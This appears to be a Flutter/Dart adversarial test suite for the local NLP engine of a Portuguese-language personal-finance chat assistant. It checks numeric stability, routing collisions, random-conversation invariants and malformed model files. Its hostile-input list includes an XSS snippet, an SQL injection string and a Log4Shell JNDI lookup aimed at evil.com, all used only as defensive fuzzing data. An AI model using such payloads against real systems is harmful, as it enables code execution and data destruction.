import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:flutter_test/flutter_test.dart';
import 'package:krezio_ai/ai/affordability_analyzer.dart';
import 'package:krezio_ai/ai/cesar_assistant.dart';
import 'package:krezio_ai/ai/debt_payment_parser.dart';
import 'package:krezio_ai/ai/goal_parser.dart';
import 'package:krezio_ai/ai/local_nlp_engine.dart';
import 'package:krezio_ai/backend/models/financial_goal.dart';
import 'package:krezio_ai/backend/models/financial_transaction.dart';
import 'package:krezio_ai/backend/repositories/financial_repository.dart';
import 'package:shared_preferences/shared_preferences.dart';

class _ChaosStepResult {
  final String route;
  final String text;
  final FinancialTransactionDraft? draft;
  final bool saved;

  const _ChaosStepResult({required this.route, required this.text, this.draft, required this.saved});
}

class _ChaosChatRunner {
  final LocalFinancialNlpEngine engine;
  final FinancialRepository repo;
  final CesarAssistant assistant;
  FinancialTransactionDraft? active;

  _ChaosChatRunner(this.engine, this.repo, DateTime Function() clock)
      : assistant = CesarAssistant(repository: repo, engine: engine, now: clock);

  _ChaosStepResult send(String input) {
    var text = input.trim();
    if (text.isEmpty) {
      return const _ChaosStepResult(route: 'empty_ignored', text: '', saved: false);
    }
    engine.setCustomCategories(repo.customCategoryNames);
    assistant.beginTurn();

    final hasPending = active != null && !active!.isComplete;
    if (hasPending && engine.isCancelCommand(text, pending: active)) {
      active = null;
      return const _ChaosStepResult(route: 'cancel_pending', text: 'Descartado', saved: false);
    }

    final cmd = assistant.handleCommand(text, hasPendingDraft: hasPending);
    if (cmd != null && cmd.rewrittenInput != null) {
      text = cmd.rewrittenInput!;
    } else if (cmd != null) {
      active = null;
      return _ChaosStepResult(route: 'cmd:${cmd.route}', text: cmd.text, saved: false);
    }

    final debt = DebtPaymentParser.parse(text);
    if (debt != null) {
      final matches = repo.findDebtorsByName(debt.personName);
      if (matches.length == 1) {
        repo.applyDebtPayment(matches.first.id, debt.amountPaid);
        return _ChaosStepResult(route: 'debt_payment', text: debt.personName, saved: true);
      }
    }

    final gc = GoalParser.parseCreation(text);
    if (gc != null) {
      repo.addGoal(FinancialGoal(
        id: 'g-${repo.goals.length + 1}',
        title: gc.title,
        targetAmount: gc.targetAmount,
        targetDate: gc.targetDate,
      ));
      return _ChaosStepResult(route: 'goal_create', text: gc.title, saved: true);
    }

    final gcontrib = GoalParser.parseContribution(text);
    if (gcontrib != null) {
      final matches = repo.findGoalsByTitle(gcontrib.goalTitle);
      if (matches.length == 1) {
        repo.contributeToGoal(matches.first.id, gcontrib.amount);
        return _ChaosStepResult(route: 'goal_contrib', text: gcontrib.goalTitle, saved: true);
      }
      return _ChaosStepResult(route: 'goal_not_found', text: gcontrib.goalTitle, saved: false);
    }

    final afford = AffordabilityAnalyzer(repository: repo).analyze(text);
    if (afford != null) {
      return _ChaosStepResult(route: 'afford:${afford.verdict.name}', text: afford.formattedText, saved: false);
    }

    final qa = assistant.handleQuestion(text, hasPendingDraft: hasPending);
    if (qa != null) {
      active = null;
      return _ChaosStepResult(route: 'qa:${qa.route}', text: qa.text, saved: false);
    }

    if (!hasPending || engine.startsNewTransaction(active!, text)) {
      final multi = engine.parseMulti(text);
      if (multi.length >= 2) {
        final prompt = engine.multiClarificationPrompt(multi);
        if (prompt == null) {
          final allIds = <String>[];
          for (final d in multi) {
            allIds.addAll(repo.addTransactionFromDraft(d).map((t) => t.id));
          }
          assistant.recordCreated(allIds);
          active = null;
          return _ChaosStepResult(route: 'multi_saved', text: '${multi.length}', saved: true);
        }
        active = null;
        return _ChaosStepResult(route: 'multi_ask', text: prompt, saved: false);
      }
    }

    final FinancialTransactionDraft draft;
    var merged = false;
    if (hasPending && !engine.startsNewTransaction(active!, text)) {
      draft = engine.mergeDrafts(active!, text);
      merged = true;
    } else {
      draft = engine.parse(text);
    }
    if (LocalFinancialNlpEngine.isRecordable(draft)) {
      final ids = repo.addTransactionFromDraft(draft).map((t) => t.id).toList();
      assistant.recordCreated(ids);
      active = null;
      return _ChaosStepResult(route: 'nlp_saved:${draft.intent}', text: draft.description, draft: draft, saved: true);
    }
    if (draft.intent == 'query') {
      active = null;
      return _ChaosStepResult(route: 'nlp_query', text: engine.replyForQuestion(draft), draft: draft, saved: false);
    }
    if (draft.intent == 'unknown' && !merged) {
      active = null;
      return _ChaosStepResult(route: 'nlp_unknown', text: draft.clarificationPrompt ?? '', draft: draft, saved: false);
    }
    active = draft;
    return _ChaosStepResult(route: 'nlp_ask:${draft.intent}', text: draft.clarificationPrompt ?? '', draft: draft, saved: false);
  }
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();
  late LocalFinancialNlpEngine engine;
  final fixedNow = DateTime(2026, 11, 11, 19, 0);

  setUpAll(() async {
    SharedPreferences.setMockInitialValues({});
    engine = LocalFinancialNlpEngine.fromJsonString(await File('models/on_device/krezio_nlp_model.json').readAsString());
    // Warm-up do JIT antes de medir p50/p95 adversariais
    engine.inspect('gastei 50 no mercado no pix');
    engine.parse('gastei 50 no mercado no pix');
  });

  FinancialRepository freshRepo() {
    final repo = FinancialRepository(seedDemo: false, persistChanges: false);
    repo.addTransaction(FinancialTransaction(
      id: 'init-sal',
      title: 'Salário',
      amount: 5000.0,
      type: TransactionType.income,
      category: 'salary',
      paymentMethod: 'pix',
      date: DateTime(2026, 11, 5),
      isRecurrent: true,
      dueBusinessDay: 5,
    ));
    repo.addTransaction(FinancialTransaction(
      id: 'init-merc',
      title: 'Supermercado',
      amount: 400.0,
      type: TransactionType.expense,
      category: 'supermarket',
      paymentMethod: 'pix',
      date: DateTime(2026, 11, 8),
    ));
    return repo;
  }

  group('Teste do Caos ML Sênior — Validação Adversarial & Estresse', () {
    test('Eixo 1. Entradas hostis, payloads extremos, Unicode, degeneração numérica e estabilidade Softmax', () {
      final hostileInputs = <String>[
        '',
        '   \t\n  ',
        '?!.,;:()[]"\'',
        '💸💳😭🍔🔥',
        '\u200B\uFEFF\u202Eoi\u200B',
        'A' * 5000,
        List.filled(250, 'pix').join(' '),
        '<script>alert(1)</script>',
        "'; DROP TABLE transactions;--",
        r'${jndi:ldap://evil.com/x}',
        '{"intent":"expense","amount":9999999}',
        'NaN',
        'Infinity',
        '-Infinity',
        '1e308',
        '1e-9',
        '0,00',
        'R\$ 0,00',
        '-50',
        'gastei -50 no mercado no pix',
        'gastei 999999999 no mercado no pix',
        'R\$ ,50',
        '1.2.3.4',
        '50 cm',
        'dia 31 de fevereiro paguei 50',
        'gastei e recebi 50 no mercado no pix',
        'paguei 50 no pix e no credito',
        'I spent 50 no mercado',
        'el pix de 50 en supermercado',
        'o pix do meu amigo é 11999887766',
        'meu cartão tem limite de 5000',
        'o mercado fecha às 22h',
        'tenho 30 anos e 2 gatos',
      ];

      // Mais 120 entradas aleatórias fuzzing Unicode/pontuação/tokens financeiros
      final rng = Random(20261111);
      final tokens = ['pix', '50', '-20', '0', '9999999', 'mercado', 'cm', 'fatura', '?', '!', 'R\$', '∞', 'NaN', '😂', 'não', 'sim', 'oi', 'qqq'];
      for (int i = 0; i < 120; i++) {
        final len = 1 + rng.nextInt(12);
        hostileInputs.add(List.generate(len, (_) => tokens[rng.nextInt(tokens.length)]).join(' '));
      }

      final latencies = <double>[];
      final findings = <String>[];

      var slowestMs = -1.0;
      var slowestInput = '';
      for (final input in hostileInputs) {
        final trace = engine.inspect(input);
        final draft = engine.parse(input);
        final multi = engine.parseMulti(input);

        latencies.add(trace.latencyMs);
        if (trace.latencyMs > slowestMs) {
          slowestMs = trace.latencyMs;
          slowestInput = input.length > 40 ? '${input.substring(0, 40)}...(${input.length}c)' : input;
        }

        // Invariantes numéricos e de modelo
        for (final m in [trace.intentModel, trace.categoryModel, trace.paymentModel]) {
          expect(m.confidence.isFinite, isTrue, reason: 'confidence NaN/Inf em "$input"');
          expect(m.margin.isFinite && m.margin >= 0.0 && m.margin <= 1.0, isTrue, reason: 'margin inválida em "$input"');
          expect(m.normalizedEntropy.isFinite && m.normalizedEntropy >= 0.0 && m.normalizedEntropy <= 1.0, isTrue,
              reason: 'entropy inválida em "$input"');
          final probSum = m.probabilities.fold<double>(0.0, (a, p) => a + p.probability);
          expect((probSum - 1.0).abs(), lessThan(1e-5), reason: 'Softmax sum != 1 ($probSum) em "$input"');
          for (final c in m.topContributions) {
            expect(c.contribution.isFinite && c.weight.isFinite && c.tfidf.isFinite, isTrue);
          }
        }
        if (draft.amount != null) {
          expect(draft.amount!.isFinite && draft.amount! >= 0, isTrue, reason: 'amount inválido (${draft.amount}) em "$input"');
        }
        expect(multi.every((d) => d.amount == null || (d.amount!.isFinite && d.amount! >= 0)), isTrue);

        if (LocalFinancialNlpEngine.isRecordable(draft)) {
          findings.add('[RECORDABLE_HOSTILE] "$input" -> intent=${draft.intent} amt=${draft.amount} cat=${draft.category} pay=${draft.paymentMethod}');
        }
      }

      latencies.sort();
      final p50 = latencies[latencies.length ~/ 2];
      final p95 = latencies[(latencies.length * 0.95).floor()];
      // ignore: avoid_print
      print('\n[CAOS EIXO 1] ${hostileInputs.length} entradas hostis | p50=${p50.toStringAsFixed(2)}ms p95=${p95.toStringAsFixed(2)}ms max=${slowestMs.toStringAsFixed(2)}ms ("$slowestInput") | achados_recordable=${findings.length}');
      for (final f in findings) {
        // ignore: avoid_print
        print('  $f');
      }
      expect(p50, lessThan(25.0));
      expect(p95, lessThan(300.0));
    });

    test('Eixo 2. Matriz de colisão entre rotas conversacionais novas e comandos financeiros reais', () {
      final runner = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);

      // 1. Paguei fatura (bloqueio de dupla contagem) vs Consulta de fatura vs Fatura de conta específica vs Produto chamado fatura
      final rPayCardBill = runner.send('paguei a fatura do cartão 500');
      expect(rPayCardBill.route, equals('qa:planner:card_bill'), reason: rPayCardBill.text);
      expect(rPayCardBill.saved, isFalse);

      final rCardStatus = runner.send('qual o valor da minha fatura?');
      expect(rCardStatus.route, equals('qa:planner:card_bill_status'), reason: rCardStatus.text);
      expect(rCardStatus.saved, isFalse);

      final rLightBill = runner.send('paguei 120 na fatura de luz no pix');
      expect(rLightBill.route, equals('nlp_saved:expense'), reason: '${rLightBill.route}: ${rLightBill.text}');
      expect(rLightBill.saved, isTrue);

      // 2. "cm" como centímetro vs início de frase ("cm tao minhas financas")
      final rUnit = runner.send('comprei fita no mercado de 50 cm por 30 reais no pix');
      expect(
        rUnit.saved,
        isTrue,
        reason: 'route=${rUnit.route} intent=${rUnit.draft?.intent} cat=${rUnit.draft?.category} amt=${rUnit.draft?.amount} missing=${rUnit.draft?.missingSlots} text=${rUnit.text}',
      );
      expect(rUnit.draft?.amount, equals(30.0));

      final rCmOverview = runner.send('cm tao minhas financas');
      expect(rCmOverview.route, equals('qa:report:overview'), reason: '${rCmOverview.route}: ${rCmOverview.text}');
      expect(rCmOverview.saved, isFalse);

      // 3. Reação ("show"/"ok") colada a gasto real não pode ser engolida pelo SmallTalk!
      final rShowSpend = runner.send('show gastei 40 no uber no pix');
      expect(rShowSpend.saved, isTrue, reason: '${rShowSpend.route}: ${rShowSpend.text}');
      expect(rShowSpend.draft?.amount, equals(40.0));

      final rOkSpend = runner.send('ok paguei 25 de cafe no pix');
      expect(rOkSpend.saved, isTrue, reason: '${rOkSpend.route}: ${rOkSpend.text}');
      expect(rOkSpend.draft?.amount, equals(25.0));

      // 4. "regra 50 30 20" conceitual vs gasto real com texto parecido
      final rRule = runner.send('regra dos 50 30 20 funciona?');
      expect(rRule.route, equals('qa:planner:knowledge'), reason: '${rRule.route}: ${rRule.text}');
      expect(rRule.saved, isFalse);

      // 5. Calculadora e operações extremas (0, negativo, divisão por zero)
      final rDivZero = runner.send('quanto é 10 dividido por 0?');
      expect(rDivZero.route, equals('qa:calc'), reason: '${rDivZero.route}: ${rDivZero.text}');
      expect(rDivZero.text.toLowerCase(), contains('zero'));

      final rCdiZero = runner.send('quanto rende 0 reais no cdi?');
      expect(rCdiZero.saved, isFalse);

      // 6. Desabafo endividado abre fluxo de dívida, mas perguntas/gastos comuns NÃO podem ser sequestrados como dívida
      final rDistress = runner.send('tô muito endividado, me ajuda');
      expect(rDistress.route, startsWith('qa:planner:payoff'), reason: '${rDistress.route}: ${rDistress.text}');
      expect(rDistress.saved, isFalse);

      final hijackProbe = runner.send('netflix 55 no credito?');
      expect(hijackProbe.route, equals('nlp_ask:expense'), reason: '${hijackProbe.route}: ${hijackProbe.text}');
      expect(hijackProbe.saved, isFalse);

      final rDistress2 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      rDistress2.send('tô muito endividado, me ajuda');
      final expenseAfterPayoff = rDistress2.send('gastei 50 no mercado no pix');
      expect(expenseAfterPayoff.route, equals('nlp_saved:expense'), reason: '${expenseAfterPayoff.route}: ${expenseAfterPayoff.text}');
      expect(expenseAfterPayoff.saved, isTrue);

      final rDistress3 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      rDistress3.send('tô muito endividado, me ajuda');
      final legitDebt = rDistress3.send('3000 no cartão');
      expect(legitDebt.route, equals('cmd:planner:debt_created'), reason: '${legitDebt.route}: ${legitDebt.text}');

      // 7. Confirmação "sim" com rascunho pendente vs sem rascunho pendente (em sessão limpa)
      final cleanRunner = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final rPending = cleanRunner.send('netflix 55 no credito?');
      expect(rPending.saved, isFalse, reason: '${rPending.route}: ${rPending.text}');
      expect(rPending.route, equals('nlp_ask:expense'), reason: 'route=${rPending.route} text=${rPending.text}');
      final rConfirm = cleanRunner.send('sim');
      expect(rConfirm.saved, isTrue, reason: '${rConfirm.route}: ${rConfirm.text}');

      // Logo após salvar, "sim" vira confirmação educada ("cmd:confirm"), nunca novo lançamento.
      final rPostSaveSim = cleanRunner.send('sim');
      expect(rPostSaveSim.route, equals('cmd:confirm'), reason: '${rPostSaveSim.route}: ${rPostSaveSim.text}');
      expect(rPostSaveSim.saved, isFalse);

      // Sem rascunho nem mutação no turno anterior, "sim" órfão vai para smalltalk condicionado.
      final orphanRunner = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final rOrphanSim = orphanRunner.send('sim');
      expect(rOrphanSim.route, equals('qa:smalltalk'), reason: '${rOrphanSim.route}: ${rOrphanSim.text}');
      expect(rOrphanSim.saved, isFalse);

      // 8. Bloqueio de negativos explícitos, valores absurdos (>= 10M) e confirmação em outliers (>= 1M)
      final rNeg = _ChaosChatRunner(engine, freshRepo(), () => fixedNow).send('gastei -50 no mercado no pix');
      expect(rNeg.saved, isFalse, reason: '${rNeg.route}: ${rNeg.text}');
      expect(rNeg.draft?.amount, isNull);

      final rGiant = _ChaosChatRunner(engine, freshRepo(), () => fixedNow).send('gastei 99999999 no mercado no pix');
      expect(rGiant.saved, isFalse, reason: '${rGiant.route}: ${rGiant.text}');
      expect(rGiant.draft?.amount, isNull);

      final outlierRunner = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final rOutlierAsk = outlierRunner.send('recebi 1000000 de salário no pix');
      expect(rOutlierAsk.saved, isFalse, reason: 'Outlier >= 1M deve pedir confirmação antes');
      expect(rOutlierAsk.draft?.missingSlots, contains('confirm'));
      final rOutlierOk = outlierRunner.send('sim');
      expect(rOutlierOk.saved, isTrue);

      final editGuardRepo = freshRepo();
      final editGuardRunner = _ChaosChatRunner(engine, editGuardRepo, () => fixedNow);
      expect(editGuardRunner.send('gastei 80 no mercado no pix').saved, isTrue);
      final newestId = editGuardRepo.transactions.firstWhere((t) => (t.amount - 80.0).abs() < 0.01).id;
      editGuardRunner.send('muda pra -30');
      expect(editGuardRepo.transactions.firstWhere((t) => t.id == newestId).amount, equals(80.0));
      editGuardRunner.send('muda pra 99999999999');
      expect(editGuardRepo.transactions.firstWhere((t) => t.id == newestId).amount, equals(80.0));

      // 9. U8: Lote de múltiplos lançamentos em 1 mensagem -> 1 "desfaz" remove o lote inteiro
      final batchRepo = freshRepo();
      final batchRunner = _ChaosChatRunner(engine, batchRepo, () => fixedNow);
      final beforeBatch = batchRepo.transactions.length;
      final rBatch = batchRunner.send('gastei 50 na feira e 30 na padaria no pix');
      expect(rBatch.saved, isTrue, reason: '${rBatch.route}: ${rBatch.text}');
      expect(batchRepo.transactions.length, equals(beforeBatch + 2));
      final rBatchUndo = batchRunner.send('desfaz');
      expect(rBatchUndo.route, equals('cmd:undo'), reason: '${rBatchUndo.route}: ${rBatchUndo.text}');
      expect(batchRepo.transactions.length, equals(beforeBatch),
          reason: 'Um único "desfaz" após lote deve remover todos os lançamentos do lote');
    });

    test('Eixo 3. Macaco conversacional com 400 turnos randômicos (Seed 42069) + invariantes do repositório', () {
      final repo = freshRepo();
      final runner = _ChaosChatRunner(engine, repo, () => fixedNow);
      final rng = Random(42069);

      const monkeyPool = [
        'oi',
        'show',
        'top',
        'ok',
        'sim',
        'não',
        'você errou',
        'não entendi nada',
        'cancela',
        'desfaz',
        'como estão minhas finanças',
        'e mês passado?',
        'onde eu gastei mais?',
        'qual o valor da minha fatura?',
        'quanto falta pro salário cair?',
        'oq vc faz?',
        'qto eu gastei hj?',
        'melhor investir 500 ou pagar dívida?',
        'posso viajar mês que vem?',
        '3000',
        'tô muito endividado, me ajuda',
        'gastei 50 no mercado no pix',
        'gastei 30 no uber',
        'no credito',
        'em 3x',
        'netflix 55 no credito?',
        'apaga o último',
        'muda pra 45',
        'gastei -50 no mercado no pix',
        'gastei 99999999 no mercado no pix',
        'comprei 50 cm de cabo por 20 reais no pix',
        '???',
        '💸💸',
      ];

      int negativeOrGiantSaved = 0;
      for (int turn = 0; turn < 400; turn++) {
        final msg = monkeyPool[rng.nextInt(monkeyPool.length)];
        final res = runner.send(msg);

        // Invariante 1: IDs únicos e valores finitos positivos
        final ids = repo.transactions.map((t) => t.id).toList();
        expect(ids.toSet().length, equals(ids.length), reason: 'ID duplicado no turno $turn após "$msg"');
        for (final t in repo.transactions) {
          expect(t.amount.isFinite && t.amount > 0, isTrue, reason: 'Valor inválido ${t.amount} no turno $turn');
        }

        // Invariante 2: Saldo consistente (considerando cofrinhos em metas!)
        double expectedBalance = 0.0;
        for (final t in repo.transactions) {
          if (t.type == TransactionType.income) {
            expectedBalance += t.amount;
          } else if (t.type == TransactionType.expense || (t.type == TransactionType.transfer && t.toAccountId == null)) {
            expectedBalance -= t.amount;
          }
        }
        expectedBalance -= repo.goals.fold<double>(0.0, (a, g) => a + g.savedAmount);
        expect((expectedBalance - repo.totalBalance).abs(), lessThan(0.02),
            reason: 'Desvio de saldo no turno $turn após "$msg" ($expectedBalance vs ${repo.totalBalance})');

        if (res.saved && (msg.contains('-50') || msg.contains('99999999'))) {
          negativeOrGiantSaved++;
        }
      }
      // ignore: avoid_print
      print('\n[CAOS EIXO 3] 400 turnos aleatórios sem exceção/NaN/corrupção | tx_finais=${repo.transactions.length} | anomalias_valor_extremo=$negativeOrGiantSaved');
      expect(negativeOrGiantSaved, equals(0));
    });

    test('Eixo 4. Integridade do _CompiledLinearModel esparso com índices extremos e perturbações de case/pontuação', () {
      final malformedSparseJson = jsonEncode({
        'meta': {'confidence_threshold': 0.55},
        'vocabulary': {'cafe': 0, 'pix': 1},
        'idf': [2.0, 2.0],
        'models': {
          'intent': {
            'classes': ['expense', 'unknown'],
            'intercept': [0.0, 0.0],
            'coef': [
              // Índice negativo, fora do vocabulário e texto inválido não podem quebrar fromJson
              {'-1': 5.0, '99999': 10.0, 'abc': 3.0, '0': 2.5},
              {'1': 1.2, 'bad': 'oops'},
            ],
          },
          'category': {
            'classes': ['food'],
            'intercept': [0.0],
            'coef': [
              {'0': 1.0}
            ],
          },
          'payment_method': {
            'classes': ['pix'],
            'intercept': [0.0],
            'coef': [
              {'1': 1.0}
            ],
          },
        },
      });

      final resilientEngine = LocalFinancialNlpEngine.fromJsonString(malformedSparseJson);
      final t1 = resilientEngine.inspect('CAFE no PIX!!');
      expect(t1.intentModel.confidence.isFinite, isTrue);

      // Perturbações de pontuação/case não podem degradar hitRate de tokens conhecidos no modelo oficial
      for (final v in ['mercado?', '  (mercado...)  ', 'MERCADO!!!', 'PIx?', 'gAstEi 50 no MeRcAdO??']) {
        final tr = engine.inspect(v);
        expect(tr.vocabHitRate, greaterThan(0.5), reason: 'Vocab hit rate caiu para $v');
        expect(tr.intentModel.confidence.isFinite, isTrue);
      }
    });

    test('Eixo 5. Round 2 & 3 — Novos probes adversariais (fluxos curtos, perguntas em fluxos, lote misto, metas/dívidas/divisão)', () {
      final bugs = <String>[];

      void checkProbe(String name, _ChaosStepResult res, bool ok, String detail) {
        if (!ok) bugs.add('[$name] route=${res.route} saved=${res.saved} amt=${res.draft?.amount} text=${res.text.replaceAll('\n', ' ')} | $detail');
      }

      // P1: Fluxos abertos do planner x entrada curta "uber 25" / "café 15" (sem verbo nem pagamento)
      final p1a = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      p1a.send('quero comprar um carro');
      final r1a = p1a.send('uber 25');
      checkProbe('GOAL_FLOW_HIJACK_NO_VERB', r1a, !r1a.route.startsWith('cmd:planner:goal'), 'Uber 25 virou preço de carro?');

      final p1b = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      p1b.send('tô muito endividado, me ajuda');
      final r1b = p1b.send('café 15');
      checkProbe('PAYOFF_FLOW_HIJACK_SHORT_EXPENSE', r1b, !r1b.route.startsWith('cmd:planner:debt'), 'Café 15 virou dívida!');

      final p1c = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      p1c.send('posso viajar mês que vem?');
      final r1c = p1c.send('almoço 35');
      checkProbe('PURCHASE_FLOW_HIJACK_SHORT_EXPENSE', r1c, !r1c.route.startsWith('cmd:planner:'), 'Almoço 35 capturado por planner!');

      // P2: Follow-up negativo após pergunta de valor ("gastei no mercado no pix" -> "-50")
      final p2 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final q2 = p2.send('gastei no mercado no pix');
      expect(q2.saved, isFalse);
      final r2 = p2.send('-50');
      checkProbe('NEGATIVE_FOLLOWUP_AMOUNT', r2, !r2.saved && (r2.draft?.amount == null), 'Follow-up "-50" foi aceito!');

      // P3: Lote misto com negativo ou gigante
      final p3 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final r3a = p3.send('gastei 50 na feira e -30 na padaria no pix');
      checkProbe('BATCH_WITH_NEGATIVE', r3a, !r3a.saved, 'Lote com -30 foi salvo direto');
      final p3b = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final r3b = p3b.send('gastei 50 na feira e 99999999 na padaria no pix');
      checkProbe('BATCH_WITH_GIANT', r3b, !r3b.saved, 'Lote com 99999999 foi salvo direto');

      // P4: ReferenceEditParser com negativo/gigante
      final p4Repo = freshRepo();
      final p4 = _ChaosChatRunner(engine, p4Repo, () => fixedNow);
      p4.send('gastei 80 na feira no pix');
      final r4a = p4.send('na verdade a feira foi -40');
      final feira1 = p4Repo.transactions.firstWhere((t) => t.title.toLowerCase().contains('feira'));
      checkProbe('REF_EDIT_NEGATIVE', r4a, feira1.amount == 80.0, 'Feira mudou para ${feira1.amount}');
      final r4b = p4.send('a feira foi 99999999');
      final feira2 = p4Repo.transactions.firstWhere((t) => t.title.toLowerCase().contains('feira'));
      checkProbe('REF_EDIT_GIANT', r4b, feira2.amount == 80.0, 'Feira mudou para ${feira2.amount}');

      // P5: Divisão de conta inválida e metas/dívidas extremas
      final p5 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final r5a = p5.send('o jantar deu 200, dividi por 0');
      checkProbe('SPLIT_BY_ZERO', r5a, !r5a.route.contains('split'), 'Divisão por 0 aceita');
      final r5b = p5.send('cria uma meta viagem de 999999999');
      checkProbe('GOAL_GIANT_AMOUNT', r5b, !r5b.saved && !r5b.route.contains('goal_created'), 'Meta gigante criada');
      final r5c = _ChaosChatRunner(engine, freshRepo(), () => fixedNow).send('quero juntar 999999999 para uma viagem');
      checkProbe('GOAL_GIANT_CREATION_PHRASE', r5c, !r5c.saved && !r5c.route.contains('goal_created'), 'Meta gigante criada via GoalParser');

      // P6: Abreviação colada em comando ("pfv apaga o último")
      final p6 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final r6 = p6.send('pfv apaga o último');
      checkProbe('ABBREV_PFV_COMMAND', r6, r6.route == 'cmd:confirm_delete', 'Esperado cmd:confirm_delete para "pfv apaga o último"');

      // P7 (Round 3): BudgetFlow + pergunta com ano ("2026") não pode capturar ano como salário
      final p7 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      p7.send('vamos definir gastos fixos para minhas economias');
      final r7 = p7.send('quanto eu gastei em 2026?');
      checkProbe('BUDGET_FLOW_QUESTION_EXIT', r7, !r7.route.startsWith('cmd:planner:budget'), 'Ano 2026 capturado como salário!');

      // P8 (Round 3): Lote com sinal negativo separado por espaço ("e - 30")
      final p8 = _ChaosChatRunner(engine, freshRepo(), () => fixedNow);
      final r8 = p8.send('gastei 50 na feira e - 30 na padaria no pix');
      checkProbe('BATCH_SPACED_NEGATIVE', r8, !r8.saved, 'Lote com "- 30" foi salvo direto!');

      // ignore: avoid_print
      print('\n[CAOS EIXO 5 — ROUND 2/3] probes=14 | novos_achados=${bugs.length}');
      for (final b in bugs) {
        // ignore: avoid_print
        print('  [ROUND2_BUG] $b');
      }
      expect(bugs, isEmpty, reason: 'Bugs do Round 2 ainda presentes:\n${bugs.join('\n')}');
    });
  });
}

